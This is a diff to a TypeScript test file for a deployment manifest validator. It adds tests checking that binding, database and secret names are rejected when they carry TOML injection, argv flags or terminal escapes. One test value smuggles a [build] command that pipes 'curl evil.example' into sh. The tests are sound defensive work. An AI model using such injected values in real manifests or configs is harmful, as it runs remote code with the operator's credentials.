@@ -137,6 +137,106 @@ describe("validateManifest", () => {
 		).toThrow(/valid semver/);
 	});
 
+	// The manifest arrives over the network and its strings are interpolated into
+	// the operator's wrangler.toml and passed to wrangler as argv. A `"` plus a
+	// newline in a binding name injects a TOML table — `[build] command = "..."`
+	// executes on the `wrangler deploy` the upgrade runs moments later, with the
+	// operator's Cloudflare credentials loaded.
+	describe("name validation", () => {
+		const TOML_INJECTION = 'DB"\n[build]\ncommand = "curl evil.example | sh"\nx = "';
+
+		it("rejects a TOML-injecting KV binding", () => {
+			expect(() =>
+				validateManifest({
+					...validRaw,
+					kvNamespaces: [{ binding: TOML_INJECTION, required: true }],
+				}),
+			).toThrow(/must be a binding name/);
+		});
+
+		it("rejects a TOML-injecting D1 binding and database name", () => {
+			expect(() =>
+				validateManifest({
+					...validRaw,
+					d1Databases: [
+						{
+							binding: TOML_INJECTION,
+							databaseName: "garrul-db",
+							required: true,
+						},
+					],
+				}),
+			).toThrow(/must be a binding name/);
+			expect(() =>
+				validateManifest({
+					...validRaw,
+					d1Databases: [
+						{
+							binding: "DB",
+							databaseName: 'garrul-db"\n[build]\ncommand = "sh"\nx = "',
+							required: true,
+						},
+					],
+				}),
+			).toThrow(/must be a D1 database name/);
+		});
+
+		it("rejects a leading dash (argv injection into the wrangler call)", () => {
+			expect(() =>
+				validateManifest({
+					...validRaw,
+					d1Databases: [
+						{ binding: "DB", databaseName: "--help", required: true },
+					],
+				}),
+			).toThrow(/must be a D1 database name/);
+			expect(() =>
+				validateManifest({
+					...validRaw,
+					secrets: [{ name: "--config", required: true }],
+				}),
+			).toThrow(/must be an env-var name/);
+		});
+
+		it("rejects names with whitespace or quotes", () => {
+			for (const binding of ['A"B', "A B", "A\tB", ""]) {
+				expect(() =>
+					validateManifest({
+						...validRaw,
+						kvNamespaces: [{ binding, required: true }],
+					}),
+				).toThrow(/must be a binding name/);
+			}
+		});
+
+		it("rejects an over-long name", () => {
+			expect(() =>
+				validateManifest({
+					...validRaw,
+					secrets: [{ name: "A".repeat(65), required: true }],
+				}),
+			).toThrow(/must be an env-var name/);
+		});
+
+		it("keeps the offending value escaped in the error message", () => {
+			// The message goes to the operator's terminal; a raw escape sequence in
+			// it could rewrite what they see.
+			expect(() =>
+				validateManifest({
+					...validRaw,
+					secrets: [{ name: `X${String.fromCharCode(27)}[2J`, required: true }],
+				}),
+			).toThrow(/\\u001b/);
+		});
+
+		it("still accepts the real manifest's names", () => {
+			const m = validateManifest(JSON.parse(JSON.stringify(validRaw)));
+			expect(m.kvNamespaces[0]?.binding).toBe("RATE_LIMITS");
+			expect(m.d1Databases[0]?.databaseName).toBe("garrul-db");
+			expect(m.analyticsDatasets[0]?.dataset).toBe("garrul_events");
+		});
+	});
+
 	it("accepts a well-formed addedIn semver", () => {
 		const m = validateManifest({
 			...validRaw,
